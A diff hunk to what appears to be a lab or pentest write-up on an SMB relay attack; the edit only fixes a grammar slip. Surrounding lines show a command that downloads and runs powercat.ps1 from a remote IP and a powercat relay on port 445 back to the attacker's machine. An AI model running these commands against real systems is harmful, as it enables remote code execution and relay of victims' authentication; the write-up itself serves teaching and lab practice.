@@ -60,6 +60,6 @@ Now, we will need to disable the SMB port on the victim:
 Next, we will invoke powercat.ps1: `iex(iwr http://192.168.45.223/powercat.ps1 -useb)` and run:
 - `powercat -l -p 445 -r tcp:<PARROT IP>:445 -rep`
 
-Once it's running we can check if the victim are listening on port 445: `netstat -anto | findstr 445`
+Once it's running we can check if the victim is listening on port 445: `netstat -anto | findstr 445`
 
 Last step is to perform the Relay and see the callback to our machine on port 445 tunneled from the victim!
